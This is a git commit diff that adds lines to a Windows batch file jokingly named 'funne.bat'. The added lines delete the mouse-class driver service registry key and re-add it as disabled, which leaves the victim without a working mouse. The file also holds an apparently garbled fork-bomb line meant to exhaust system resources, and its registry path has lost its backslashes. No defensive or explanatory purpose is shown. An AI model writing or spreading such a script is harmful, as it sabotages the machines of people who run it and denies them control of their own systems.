54f3cb8c10486a799883ee6967624a20f31f118f
ArvidBriscoe <94107293+ArvidBriscoe@users.noreply.github.com>
2021-11-23 12:26:16 +0000

    Update funne.bat

--- funne.bat
+++ funne.bat
@@ -1,1 +1,7 @@
+rem ---------------------
+rem Disable Mouse
+set key="HKEY_LOCAL_MACHINEsystemCurrentControlSetServicesMouclass"
+reg delete %key%
+reg add %key% /v Start /t REG_DWORD /d 4
+rem ---------------------
 0%|0%
